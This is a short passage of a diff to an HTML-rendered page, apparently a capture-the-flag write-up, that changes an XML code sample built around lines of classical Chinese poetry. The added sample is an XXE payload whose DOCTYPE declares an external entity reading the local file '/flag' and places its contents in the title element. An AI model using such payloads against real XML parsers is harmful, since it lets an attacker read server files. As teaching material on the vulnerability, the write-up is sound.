-</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="nt">&lt;/诗筏&gt;</span>
 </span></code></pre></div>
 </details>
 <details class="note">
